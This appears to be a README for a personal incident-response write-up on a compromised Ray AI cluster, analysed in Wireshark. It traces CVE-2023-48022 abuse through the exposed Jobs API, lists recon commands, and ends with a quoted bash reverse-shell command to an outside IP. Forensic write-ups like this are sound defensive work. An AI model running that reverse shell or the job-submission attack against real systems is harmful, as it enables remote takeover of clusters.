# Compromised AI Cluster

This repository contains my investigation of a compromised Ray AI Cluster where an exposed Ray Job Submission API was abused to achieve Remote Code Execution (CVE-2023-48022), establish a reverse shell, collect sensitive information, exfiltrate data, and perform internal network reconnaissance.

## Skills Demonstrated

- Incident Response
- Network Traffic Analysis
- Wireshark
- Threat Hunting
- Linux Investigation
- MITRE ATT&CK Mapping
- IOC Identification
- Timeline Reconstruction

# Ray AI Cluster Investigation

> Malware Traffic Analysis – Ray AI Cluster Compromise

[![View PDF](./Ray_AI_Cluster_Investigation.pdf)](./Ray_AI_Cluster_Investigation.pdf)

---

## Overview

An unusual increase in traffic was detected on an externally exposed Ray AI cluster. Network analysis revealed that an attacker exploited the exposed environment, executed remote commands, established a reverse shell, performed reconnaissance, exfiltrated sensitive data, and conducted network scanning activities.

This investigation was performed using **Wireshark** and focused on identifying the attack sequence, malicious infrastructure, and the overall impact on the Ray cluster.

---

## Tools Used

- Wireshark
- HTTP Stream Analysis
- TCP Stream Analysis
- Endpoint Statistics

---

## Investigation Workflow

### 1. Ray Version Enumeration

The attacker first queried the exposed Ray API to determine the running version.

**Evidence**

- `GET /api/version`
- Ray version identified: `2.8.0`

**Screenshot**

- Figure 3 — Ray Version Identification (`/api/version`)

---

### 2. Remote Job Submission

The attacker used the Ray Jobs API to submit commands for execution.

**Evidence**

- `POST /api/jobs`

The API created a unique submission ID for each command.

**Screenshot**

- Figure 2 — HTTP POST Request to `/api/jobs`

---

### 3. Command Execution and Reconnaissance

After gaining code execution, the attacker executed several Linux commands to gather information.

**Commands observed**

- `whoami`
- `ls`
- `pwd`
- `/usr/bin/pwd`
- `wget`
- `sudo ./ahcii`

**Purpose**

- Identify the current user.
- List directory contents.
- Determine the current working directory.
- Download additional resources.

**Screenshot**

- Figure 4 — Job Submission Executing Linux Commands

---

### 4. Reverse Shell Establishment

The attacker established an interactive reverse shell using Bash.

**Command observed**

```bash
/bin/bash -c "bash -i > /dev/tcp/52.150.25.174/1337 0<&1 1>&0 2>&0"
